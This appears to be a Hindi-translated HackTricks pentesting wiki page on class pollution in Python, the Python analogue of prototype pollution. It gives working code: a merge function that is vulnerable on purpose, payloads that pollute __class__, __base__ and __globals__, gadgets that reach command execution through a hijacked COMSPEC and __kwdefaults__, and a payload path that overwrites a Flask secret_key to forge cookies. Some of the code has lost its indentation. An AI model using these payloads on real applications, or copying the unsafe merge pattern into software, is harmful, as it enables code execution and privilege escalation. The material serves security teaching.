# कक्षा प्रदूषण (Python का प्रोटोटाइप प्रदूषण)

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **हमें** **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

## मूल उदाहरण

जांचें कैसे संदेशों के साथ ऑब्जेक्ट की कक्षाओं को प्रदूषित किया जा सकता है:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## मूलभूत सुरक्षादायकता उदाहरण
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## गैजेट उदाहरण

<details>

<summary>कक्ष संपत्ति डिफ़ॉल्ट मान को RCE (subprocess) बनाना</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>अन्य क्लासेस और ग्लोबल वेरिएबल को <code>globals</code> के माध्यम से प्रदूषित करना</summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>अनियमित subprocess क्रियान्वयन</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>ओवरराइटिंग <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** सभी फ़ंक्शन की एक विशेष विशेषता है, Python [दस्तावेज़ीकरण](https://docs.python.org/3/library/inspect.html) के आधार पर, यह "किसी भी डिफ़ॉल्ट मानों का मैपिंग है **कीवर्ड-केवल** पैरामीटर्स के लिए।" इस विशेषता को प्रदूषित करने से हमें फ़ंक्शन के कीवर्ड-केवल पैरामीटर्स की डिफ़ॉल्ट मानों को नियंत्रित करने की अनुमति मिलती है, ये वह फ़ंक्शन के पैरामीटर्स हैं जो \* या \*args के बाद आते हैं।
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>फ़्लास्क सीक्रेट को फ़ाइलों के बीच ओवरराइट करना</summary>

तो, अगर आप एक क्लास पोल्लूशन कर सकते हैं जो एक वेब के मुख्य पायथन फ़ाइल में परिभाषित ऑब्जेक्ट पर **हो** लेकिन **जिसका क्लास मुख्य फ़ाइल से अलग फ़ाइल में परिभाषित है**। क्योंकि पिछले payloads में \_\_globals\_\_ तक पहुँचने के लिए आपको ऑब्जेक्ट के क्लास या क्लास के मेथड्स तक पहुँचने की आवश्यकता है, आप **उस फ़ाइल में ग्लोबल्स तक पहुँच सकेंगे, लेकिन मुख्य फ़ाइल में नहीं**। \
इसलिए, आप **फ़्लास्क एप्लिकेशन ग्लोबल ऑब्जेक्ट तक पहुँच नहीं पाएंगे** जिसने मुख्य पृष्ठ में **सीक्रेट कुंजी** को परिभाषित किया था:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
इस स्थिति में आपको एक गैजेट की आवश्यकता है जो फ़ाइलों को ट्रावर्स करने के लिए मुख्य फ़ाइल तक पहुंचने के लिए **ग्लोबल ऑब्जेक्ट `app.secret_key` तक पहुंचने** के लिए फ्लास्क सीक्रेट कुंजी को बदलने और [**इस कुंजी को जानकर विशेषाधिकारों को बढ़ाने**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) के लिए सक्षम होना होगा।

इस तरह के एक पेलोड [इस लेखन से](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

इस payload का उपयोग करें **`app.secret_key` को बदलने** के लिए (आपके ऐप में नाम अलग हो सकता है) नए और अधिक विशेषाधिकार वाले flask cookies को साइन करने की क्षमता प्राप्त करें।

</details>

और अधिक केवल पढ़ने योग्य गैजेट्स के लिए निम्नलिखित पृष्ठ भी देखें:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## संदर्भ

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर हमें** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos को PR जमा करके।

</details>
{% endhint %}
